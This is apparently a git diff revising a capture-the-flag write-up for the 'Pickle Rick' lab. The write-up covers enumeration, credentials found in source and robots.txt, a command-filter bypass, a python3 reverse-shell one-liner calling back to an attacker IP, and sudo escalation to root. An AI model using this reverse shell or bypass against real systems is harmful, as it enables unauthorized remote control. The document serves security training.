@@ -14,7 +14,7 @@
 - [Conclusion](#conclusion)
 
 ## NMAP Scan
-Let's make an nmap scan using the following cmd ```sudo nmap -sV -A 10.10.181.166 -oN nmapresultat.txt```
+Let's make an nmap scan using the following cmd ==> ```sudo nmap -sV -A 10.10.181.166 -oN nmapresultat.txt```
 
 ```
 sudo nmap -sV -A 10.10.181.166 -oN nmapResultsB.txt 
@@ -65,17 +65,17 @@ Nmap done: 1 IP address (1 host up) scanned in 26.39 seconds
 
 If we go to the index page of the website, we can see that Rick is talking about a password that he forgot.
 
-![alt text](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/2.PNG#center)
+![img](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/2.PNG#center)
 
 Looking at the source code of the page, we can see that Rick left a comment containing a username.  
 
-![alt text](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/3.PNG#center)
+![img](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/1.PNG#center)
 
 So now we have a username : **R1ckRul3s**
 
-One of the first things I look for when i'm enumerating a website is the robots.txt file. So let's see if there is a robots.txt file on this web server.
+One of the first things I look for when i'm enumerating a website is the robots.txt file. So let's see if there is a robots.txt file on this web server.  
 
-![alt text](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/4.PNG#center)
+![img](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/3.PNG#center)
 
 And we found a strange looking strings... It's not a page of the webserver so.. Maybe the password that Rick lost ? Let's write it down for the moment. 
 ```Robots.txt: **Wubbalubbadubdub**```
@@ -138,12 +138,11 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 And we found a login.php page ! (The portal.php page redirects us to login.php)  
 So let's go to this page and try to login with the informations we gathered :
 
-![alt text](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/4.PNG#center)
-
+![img](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/4.PNG#center)
 
 Using **R1ckRul3s** as login and **Wubbalubbadubdub** as password, we are redirected to a portal.php page.  
 
-![alt text](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/5.PNG#center)
+![img](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/5.PNG#center)
 
 
 We cannot access any pages using the menu on top of the page. All tabs redirect us to **denied.php**  with the following message:"Only the REAL rick can view this page.." 
@@ -155,9 +154,6 @@ But on the Commands tab we have an input field that seems to be used to run comm
 We see that we can run linux commands. So we can try to use some other commands... I tried some useful commands and , we can run ls, wget, sudo -l, and cat, but there is some filters that prevent from using some commands , like for cat.  
 
 ![img](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/7.PNG#center)
-
-
-<div style="text-align:center"><img src="https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/7.PNG" /></div>
 
 We can easily bypass those filters by just putting a '\\' inside the command, like so : **c\at file**.  
 
@@ -171,7 +167,7 @@ Now we have multiple choices:
 1. I could just find the different flags using this command input, using  `sudo -l`
 2. Get a reverse shell, this will be more easier for searching on the machine.
 
-Like I said, we can use `sudo -l`  
+Like I said, we can use sudo -l   
 
 ![img](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/9.PNG#center)
 
@@ -190,7 +186,7 @@ After starting a listener on my machine i used an one liner python3 shell on the
 
 `nc -lnvp 4545`
 
-```python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.69.102",4545));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'```
+`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.69.102",4545));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`
 
 And i got a reverse shell which i stabilized using the following commands 
 
@@ -222,6 +218,3 @@ Now I can get the 3 ingredients for the potion that Rick needs :
 - I also learned that it is very easy for an attacker to get a full control of the machine if the user ```www-data``` has too much permissions, i was able to do ```sudo -l``` to check that i have all permissions to do ```sudo su``` without password. So it is very important to manage permissions properly.
 
  ```www-data``` should not have the right to run any command as root.
-
- 
-
